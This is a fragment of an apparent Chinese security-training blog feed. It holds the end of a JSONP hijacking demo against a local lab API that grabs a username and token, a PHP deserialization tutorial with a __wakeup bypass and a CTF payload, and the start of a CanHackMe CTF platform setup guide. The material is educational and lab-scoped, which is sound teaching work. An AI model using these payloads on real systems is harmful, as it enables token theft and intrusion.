    &amp;lt;script src=&amp;#34;http://localhost:8081/LKWA/api/user?callback=a&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -S localhost:9000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;浏览网址之后。就可以获取用户名和 token&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-13-102536299</guid>
<pubDate>Mon, 13 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>理解PHP反序列化漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-10-102166928.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102166928&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;很多小白可能都会有这样的疑惑，PHP 我知道，序列化我也知道，合在一起的 PHP 反序列化就搞不懂了。&lt;/p&gt;&lt;p&gt;今天就来破解 PHP 反序列化漏洞之谜。&lt;/p&gt;&lt;h2&gt;PHP序列化与反序列化&lt;/h2&gt;&lt;p&gt;首先，我们来理解，PHP 序列化与 PHP 反序列化这两个名词。&lt;/p&gt;&lt;blockquote&gt;序列化，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;serialize()&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;函数用于序列化对象或数组，并返回一个字符串。&lt;/blockquote&gt;&lt;p&gt;简单来说，序列化就是把一水果整齐的放在果盘里，比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
echo  $serialized_data;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;a:3:{i:0;s:1:&amp;#34;a&amp;#34;;i:1;s:2:&amp;#34;bb&amp;#34;;i:2;s:3:&amp;#34;ccc&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;o表示对象，a表示数组，s表示字符，i表示数字&lt;/blockquote&gt;&lt;p&gt;意思就是往果盘里面放了一个苹果、两个香蕉、三个梨，总共 3 类。&lt;/p&gt;&lt;p&gt;放入对象也是类似的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class name1 {
    var $test1;
    var $test2;
}
$test3 = new name1;
$test3-&amp;gt;test1 = &amp;#39;hi&amp;#39;;
$test3-&amp;gt;test2 = &amp;#39;fun&amp;#39;;
echo serialize($test3); &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:5:&amp;#34;name1&amp;#34;:2:{s:5:&amp;#34;test1&amp;#34;;s:2:&amp;#34;hi&amp;#34;;s:5:&amp;#34;test2&amp;#34;;s:3:&amp;#34;fun&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;unserialize()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;单词前面加个“un”，大家都不陌生吧，就是跟前面相反的意思，把水果从果盘里面拿出来。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
$unserialized_data = unserialize($serialized_data);
print_r($unserialized_data);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Array
(
    [0] =&amp;gt;  a
    [1] =&amp;gt;  bb
    [2] =&amp;gt;  ccc
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就是 PHP 的反序列化，返回原始的结构。&lt;/p&gt;&lt;h2&gt;反序列化漏洞&lt;/h2&gt;&lt;p&gt;不就是放水果、拿水果吗？有什么危险的。&lt;/p&gt;&lt;p&gt;下面来介绍几种“果虫”，也就是危险的 PHP 魔法函数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;construct():当一个类被创建时自动调用
destruct():当一个类被销毁时自动调用
invoke():当把一个类当作函数使用时自动调用
tostring():当把一个类当作字符串使用时自动调用
wakeup():当调用unserialize()函数时自动调用
sleep():当调用serialize()函数时自动调用
__call():当要调用的方法不存在或权限不足时自动调用&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;来看看是怎样祸害我们的水果的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class chybeta{
	var $test = &amp;#39;123&amp;#39;;
	function __wakeup(){
		echo &amp;#34;__wakeup&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __construct(){
		echo &amp;#34;__construct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __destruct(){
		echo &amp;#34;__destruct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
}
$class2 = &amp;#39;O:7:&amp;#34;chybeta&amp;#34;:1:{s:4:&amp;#34;test&amp;#34;;s:3:&amp;#34;123&amp;#34;;}&amp;#39;;
	print_r($class2);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
$class2_unser = unserialize($class2);
print_r($class2_unser);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;unserialize() 反序列化之后，会导致 wakeup() 或 destruct() 的直接调用，因此最理想的情况就是一些漏洞/危害代码在 wakeup() 或 destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。&lt;/p&gt;&lt;p&gt;&lt;b&gt;绕过魔法函数&lt;/b&gt;&lt;/p&gt;&lt;p&gt;魔法函数 sleep() 和 wakeup()&lt;/p&gt;&lt;blockquote&gt;php 文档中定义 __wakeup():&lt;br/&gt;unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep() 则相反，是用在序列化一个对象时被调用.&lt;/blockquote&gt;&lt;p&gt;正常情况下的反序列化漏洞如下图：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;析构方法和 __wakeup 都能够执行&lt;/p&gt;&lt;p&gt;如果我们把传入的序列化字符串的属性个数更改成大于 1 的任何数&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:7:&amp;#34;hpdoger&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:6:&amp;#34;u know&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图，__wakeup 没有被执行，但是执行了析构函数&lt;/p&gt;&lt;h2&gt;CTF题实战&lt;/h2&gt;&lt;p&gt;&lt;b&gt;南邮CTF&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun { //定义了一个类
    var $enter;
    var $secret;
}
if (isset($_GET[&amp;#39;pass&amp;#39;])) {
    $pass = $_GET[&amp;#39;pass&amp;#39;];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass); //进行反序列化处理

    if ($o) {
        $o-&amp;gt;secret = &amp;#34;*&amp;#34;; //这里不知道*代表的是啥
        if ($o-&amp;gt;secret === $o-&amp;gt;enter) //要求$o中的两个属性值相同
            echo &amp;#34;Congratulation! Here is my secret: &amp;#34;.$o-&amp;gt;secret;
        else 
            echo &amp;#34;Oh no... You can&amp;#39;t fool me&amp;#34;;
    }
    else echo &amp;#34;are you trolling?&amp;#34;;
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于我们不知道 * 代表的是什么，所以用指针来直接让两个的属性相等。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun {
    var $enter;
    var $secret;
}
$o = new just4fun;
$o-&amp;gt;enter = &amp;amp;$o-&amp;gt;secret; //这里的a=&amp;amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b
echo serialize($o);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本地运行即可得到序列化字符串&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:8:&amp;#34;just4fun&amp;#34;:2:{s:5:&amp;#34;enter&amp;#34;;N;s:6:&amp;#34;secret&amp;#34;;R:2;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后将此作为 pass 参数 GET 发送即可获得 flag。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-10-102166928</guid>
<pubDate>Fri, 10 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF平台搭建：CanHackMe</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101994123.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101994123&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8eec1bba32fd0da619e3282f391992b4_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;CanHackMe🎯&lt;/h2&gt;&lt;p&gt;一个基于 php 的 CTF 开源平台。&lt;/p&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//canhack.me/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;ht&lt;/a&gt;tps://canhack.me/&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;搭建环境📐&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境（Ubuntu 16.04+Apache 2.4+PHP 7.3）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安装 Apache 2.4&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt update
sudo apt install apache2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后检查是否成功：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;apache2 -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装 PHP 7.3&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt-get install software-properties-common
sudo add-apt-repository ppa:ondrej/php
sudo apt-get update
sudo apt-get install -y php7.3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;检查是否成功：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装 Sqlite3&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;SQLite 是一个软件库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是在世界上最广泛部署的 SQL 数据库引擎。SQLite 源代码不受版权限制。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;安装 php-sqlite3 模块&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php7.3-sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里需要注意，要修改 php.ini 文件 /etc/php/7.3/apache2/php.ini，把前面的分号去掉&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;安装 php-mbstring 模块&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php-mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同样的，需要修改 php.ini 文件 /etc/php/7.3/apache2/php.ini，把前面的分号去掉&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;项目搭建&lt;/h2&gt;&lt;p&gt;&lt;b&gt;下载&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先下载项目，直接下载上传：&lt;/p&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;git 方式下载：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;git clone https://github.com/safflower/canhackme&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;配置路由&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先配置路由，修改 apache2 配置文件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;vim /etc/apache2/apache2.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把路径改成你实际的网站根目录，AllowOverride None 改为 AllowOverride ALL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code 